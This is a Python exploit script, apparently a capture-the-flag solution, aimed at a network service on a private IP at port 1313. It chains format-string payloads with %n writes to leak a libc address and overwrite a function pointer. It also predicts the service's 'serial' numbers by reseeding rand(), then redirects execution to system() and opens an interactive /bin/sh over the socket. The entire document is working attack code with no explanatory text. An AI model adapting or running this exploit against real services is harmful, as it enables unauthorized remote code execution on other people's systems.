from socket import *
from telnetlib import *
from ctypes import *
import time, struct

p = lambda x: struct.pack("<L", x)
up = lambda x: struct.unpack("<L", x)[0]

libc = cdll.LoadLibrary("libc.so.6")
serial1, serial2 = [0] * 6, [0] * 6
serial = [0] * 12
libcBase = 0x1b7000
system_offset = 0x3b160

def recvuntil(t):
	data = ''
	while not data.endswith(t):
		tmp = s.recv(1)
		if not tmp: break
		data += tmp
	return data

s = socket(AF_INET, SOCK_STREAM)
s.connect(('192.168.60.131', 1313))

time.sleep(0.3)
print recvuntil("Who are you? ")
name_payload = "\x24\xa0\x04\x08AAAA\x26\xa0\x04\x08%34887c%17$n%32689c%19$n%2$08x"
name_payload += "A" * (0x64 - len(name_payload))
s.send(name_payload + "\n")
print recvuntil(name_payload)

seed = up(s.recv(4))
print "[*] /dev/urandom seed : " + hex(seed)
libc.srand(seed)
for i in range(12):
	serial[i] = libc.rand() % 45 + 1

serial1 = serial[0:6]
print "[*] Serial Crack No.1"
serial1 = ' '.join(str(se) for se in serial1)
s.send(serial1 + "\n")
time.sleep(0.3)

data = recvuntil("f7")
data = recvuntil("You Win!!\n")[0:6]
data = "0xf7" + data
base = int(data, 16) - libcBase
system = base + system_offset
print "[*] libc Base : " + str(hex(base))
print "[*] System Function : " + str(hex(system))

name_payload = "\x3c\xa0\x04\x08AAAA\x3e\xa0\x04\x08%35162c%17$n%32414c%19$n"
s.send(name_payload + "\n")

print recvuntil("==> ")
serial2 = serial[6:12]
serial2 = ' '.join(str(se) for se in serial2)
print "[*] Serial Crack No.2"
s.send(serial2 + "\n")

fmt_1 = str(system & 0x0000ffff)
fmt_2 = str((system & 0xffff0000) - (system & 0x0000ffff))
name_payload = "\x10\xa0\x04\x08AAAA\x12\xa0\x04\x08%" + fmt_1 + "c" + "%17$n" + fmt_2 + "c%19$n"

s.send(name_payload + "\n")
s.send(";/bin/sh;\n")

t = Telnet()
t.sock = s
t.interact()
